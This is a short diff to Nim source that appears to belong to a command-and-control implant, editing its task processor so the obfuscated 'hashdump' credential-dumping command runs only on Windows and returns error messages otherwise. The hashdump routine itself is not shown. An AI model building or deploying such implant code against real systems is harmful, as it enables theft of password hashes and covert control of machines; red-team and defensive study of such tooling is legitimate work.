@@ -921,8 +921,23 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
     
     of obf("hashdump"):
       when defined(cmd_hashdump):
-        debugLog "task_processor", "Executing hashdump command"
-        result.response = hashdump(taskId, params)
+        when defined(windows):
+          debugLog "task_processor", "Executing hashdump command"
+          result.response = hashdump(taskId, params)
+        else:
+          result.response = %*{
+            obf("task_id"): taskId,
+            obf("completed"): true,
+            obf("status"): "error",
+            obf("user_output"): obf("hashdump command is only available on Windows")
+          }
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("hashdump was not compiled into this payload")
+        }
     
     else:
       # Command not implemented
